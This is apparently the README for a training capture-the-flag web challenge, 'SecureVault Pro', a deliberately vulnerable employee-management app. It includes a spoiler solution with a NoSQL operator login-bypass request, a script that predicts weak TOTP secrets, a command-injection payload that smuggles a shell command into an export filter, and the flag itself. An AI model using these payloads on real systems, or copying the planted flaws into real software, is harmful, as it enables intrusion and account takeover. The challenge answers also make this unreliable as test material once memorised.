# 🔐 SecureVault Pro - Multi-Stage CTF Challenge

A sophisticated web security CTF challenge featuring a corporate employee management system with multiple chained vulnerabilities. Players must exploit NoSQL injection, bypass weak 2FA, and perform command injection to capture the flag.

## 🎯 Challenge Information

- **Name:** SecureVault Pro
- **Category:** Web Security
- **Difficulty:** Medium-Hard
- **Points:** 400-500
- **Flag:** `CTF{n0sql_2fa_byp4ss_m4st3r_2024}`
- **Estimated Solve Time:** 45-90 minutes

## 🚀 Quick Start

### Using Docker (Recommended)

```bash
# Navigate to challenge directory
cd Web/vibe_slep

# Build and run with Docker Compose
docker-compose up -d

# Verify services are running
docker-compose ps

# Access the challenge
# Open browser to: http://localhost:3000
```

### Manual Setup (Development)

```bash
# Install dependencies
npm install

# Set up environment
cp .env.example .env

# Initialize MongoDB
mongod --dbpath ./data

# Seed database
npm run db:seed

# Start the server
npm start

# For development mode
npm run dev
```

## 📋 Challenge Stages

### Stage 1: Reconnaissance & NoSQL Injection
- Discover exposed debug endpoints
- Identify database structure
- Exploit NoSQL injection to bypass authentication
- Extract admin credentials

### Stage 2: Two-Factor Authentication Bypass
- Analyze weak TOTP implementation
- Discover predictable secret generation
- Generate valid OTP codes
- Bypass 2FA protection

### Stage 3: Admin Panel Exploitation
- Access restricted admin functionality
- Identify command injection vulnerability
- Execute system commands
- Retrieve the flag

## 🔍 Attack Surface

```
http://localhost:3000/
├── /                           # Landing page
├── /login                      # Login form (NoSQL injection)
├── /api/debug/schema          # DEBUG ENDPOINT (information disclosure)
├── /api/login                 # Authentication endpoint (vulnerable)
├── /api/verify-2fa            # 2FA verification (weak implementation)
├── /admin                     # Admin dashboard (requires auth)
├── /api/admin/export-employees # CSV export (command injection)
└── /api/admin/system-info     # System information (flag pieces)
```

## 💡 Player Hints (Progressive)

1. **Discovery Phase**
   - Look for debug or development endpoints
   - Check HTTP response headers for clues
   - Examine source code comments

2. **NoSQL Injection**
   - MongoDB query operators can be powerful
   - Authentication might accept more than strings
   - Check what data the API returns

3. **2FA Bypass**
   - TOTP secrets should be random, but are they?
   - Time windows might be more generous than expected
   - Debug information could reveal implementation details

4. **Command Injection**
   - Export features often interact with system commands
   - Filter parameters might do more than filter
   - Error messages can be informative

## 🛠️ Technology Stack

- **Backend:** Node.js with Express
- **Database:** MongoDB 6.0
- **Authentication:** JWT + TOTP (Speakeasy)
- **Frontend:** React with Material-UI
- **Container:** Docker & Docker Compose

## 📁 Project Structure

```
Web/vibe_slep/
├── server/               # Backend application
│   ├── app.js           # Main Express app
│   ├── routes/          # API endpoints
│   ├── models/          # MongoDB schemas
│   └── middleware/      # Auth & validation
├── client/              # Frontend application
│   ├── public/          # Static files
│   └── src/            # React components
├── database/           # Database scripts
├── flag/              # Flag storage
├── docker-compose.yml # Container orchestration
├── Dockerfile        # Container definition
└── README.md        # This file
```

## 🔒 Intentional Vulnerabilities

This challenge contains deliberate security flaws for educational purposes:

1. **Information Disclosure**
   - Exposed debug endpoints
   - Verbose error messages
   - Source code comments with hints

2. **NoSQL Injection**
   - Unsanitized user input
   - Direct query object passing
   - Authentication bypass via operators

3. **Weak 2FA**
   - Predictable TOTP secret generation
   - Excessive time window tolerance
   - Secret leakage in API responses

4. **Command Injection**
   - Unsanitized parameters in system commands
   - Direct command execution
   - Insufficient input validation

5. **JWT Issues**
   - Weak/predictable secret key
   - Client-side storage vulnerabilities
   - Debug information exposure

## 🐳 Docker Commands

```bash
# Build the challenge
docker-compose build

# Start services
docker-compose up -d

# View logs
docker-compose logs -f

# Stop services
docker-compose down

# Clean up everything
docker-compose down -v --remove-orphans

# Access MongoDB shell
docker exec -it securevault-db mongosh

# Access application shell
docker exec -it securevault-app /bin/sh
```

## 🧪 Testing the Challenge

### Automated Test Suite

```bash
# Run all tests
npm test

# Test specific vulnerability
npm test -- --grep "NoSQL"

# Test with coverage
npm run test:coverage
```

### Manual Testing Checklist

- [ ] Application loads at http://localhost:3000
- [ ] Debug endpoint is accessible
- [ ] NoSQL injection works on login
- [ ] Admin credentials are exposed
- [ ] TOTP can be predicted
- [ ] 2FA bypass is possible
- [ ] Admin panel is accessible with valid JWT
- [ ] Command injection works in export
- [ ] Flag is retrievable
- [ ] All three stages flow correctly

## 📊 Monitoring & Admin

### View Statistics

```bash
# Check solve attempts
docker exec securevault-db mongosh securevault_prod --eval "db.attempts.find()"

# Monitor active sessions
docker exec securevault-db mongosh securevault_prod --eval "db.sessions.find({active: true})"

# View successful solves
docker exec securevault-app cat /var/log/solves.log
```

### Reset Challenge

```bash
# Full reset
docker-compose down -v
docker-compose up -d

# Reset database only
docker exec securevault-db mongosh securevault_prod --eval "db.dropDatabase()"
docker-compose restart
```

## 🎓 Learning Objectives

Players will learn about:

1. **Web Reconnaissance**
   - Endpoint discovery
   - Information gathering
   - Debug mode detection

2. **NoSQL Vulnerabilities**
   - Query operator injection
   - Authentication bypass
   - Data extraction

3. **2FA Security**
   - TOTP implementation
   - Common weaknesses
   - Time-based attacks

4. **Command Injection**
   - Input sanitization
   - System command execution
   - Privilege escalation

5. **JWT Security**
   - Token manipulation
   - Secret management
   - Storage vulnerabilities

## 🚨 Production Warning

**DO NOT DEPLOY THIS IN PRODUCTION!**

This application contains intentional security vulnerabilities for CTF purposes. It should only be run in isolated, controlled environments for security training and education.

## 📝 Solution Guide

<details>
<summary>⚠️ SPOILER: Click to reveal the solution</summary>

### Complete Walkthrough

1. **Stage 1: Discovery & NoSQL Injection**

```bash
# Find debug endpoint
curl http://localhost:3000/api/debug/schema

# NoSQL injection to bypass auth
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'

# Response contains admin email and TOTP secret
```

2. **Stage 2: 2FA Bypass**

```python
import hashlib
import pyotp
import base64

# Generate predictable TOTP
email = "admin@securevault.local"
secret_string = f"{email}_securevault_2024"
md5_hash = hashlib.md5(secret_string.encode()).hexdigest()
secret = md5_hash[:20]

# Create TOTP
totp = pyotp.TOTP(base64.b32encode(secret.encode()).decode())
otp = totp.now()
print(f"Valid OTP: {otp}")
```

3. **Stage 3: Command Injection**

```bash
# Get JWT from 2FA response
JWT="your_jwt_token_here"

# Exploit command injection
curl -X POST http://localhost:3000/api/admin/export-employees \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"format": "csv", "filter": "{}'\'' && cat /tmp/flag/flag.txt || echo '\''{}"}'

# Flag: CTF{n0sql_2fa_byp4ss_m4st3r_2024}
```

</details>

## 🤝 Contributing

To improve this challenge:

1. Fork the repository
2. Create a feature branch
3. Make your improvements
4. Test thoroughly
5. Submit a pull request

## 📧 Support

For issues or questions:
- Create an issue in the repository
- Contact the CTF organizers
- Check the FAQ section

## 📚 Additional Resources

- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [TOTP RFC 6238](https://tools.ietf.org/html/rfc6238)
- [Command Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [JWT Security Best Practices](https://tools.ietf.org/html/rfc8725)

---

**Version:** 1.0.0  
**Author:** CTF Development Team  
**License:** MIT (Educational Use Only)  
**Last Updated:** December 2024

⚡ **Happy Hacking!** ⚡